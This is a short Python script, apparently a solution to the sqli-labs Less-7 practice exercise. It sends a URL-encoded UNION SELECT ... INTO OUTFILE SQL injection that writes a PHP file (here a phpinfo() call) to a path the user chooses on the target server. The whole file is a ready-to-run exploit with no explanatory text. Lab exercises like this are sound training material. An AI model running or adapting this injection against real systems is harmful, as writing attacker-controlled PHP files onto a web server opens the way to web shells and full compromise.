#!/usr/bin/env python

import requests
import re
import string
import sys
import time
import urllib

banner = '''
USAGE: python %s <File Path>
EXAMPLE: python %s "/tmp/proof.txt"
''' % (sys.argv[0], sys.argv[0])

if(len(sys.argv) != 2):
    print(banner)
    exit(0)
else:
    pass

sourcestr = string.printable
url = "http://172.16.214.227/sqli-labs/Less-7/?id="
phpinfo = "<?php phpinfo(); ?>"

header = {
    "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Connection": "close",
}

query = urllib.quote("1')) union select 1,2,'%s' into outfile '%s';-- " % (phpinfo, sys.argv[1]))
target = url + query
print("[*] Query: %s" % query)
print("[*] Creating: %s" % sys.argv[1])
res = requests.get(target, headers=header, verify=False)

print("[*] SUCCESS?")
